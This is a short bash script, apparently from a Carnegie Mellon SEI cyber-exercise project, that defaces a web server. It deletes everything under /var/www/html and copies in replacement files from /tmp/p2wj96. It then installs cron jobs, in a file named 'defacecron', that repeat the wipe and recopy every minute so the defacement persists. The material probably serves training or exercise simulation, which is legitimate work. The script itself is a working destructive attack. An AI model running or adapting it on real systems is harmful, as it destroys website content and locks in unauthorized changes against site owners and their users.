#!/bin/bash

# Copyright 2023 Carnegie Mellon University.
# Released under a MIT (SEI)-style license, please see LICENSE.md in the project 
# root or contact permission@sei.cmu.edu for full terms.

rm -rf /var/www/html/*
cp /tmp/p2wj96/* /var/www/html/

sleep 1 

crontab -l > /tmp/defacecron

if grep -F "rm -rf /var/www/html/" /tmp/defacecron
then
    :
else
    echo "* * * * * rm -rf /var/www/html/*" >> /tmp/defacecron
    echo "* * * * * ( sleep 1 ; cp -r /tmp/p2wj96/* /var/www/html/ )" >> /tmp/defacecron
    crontab /tmp/defacecron
fi


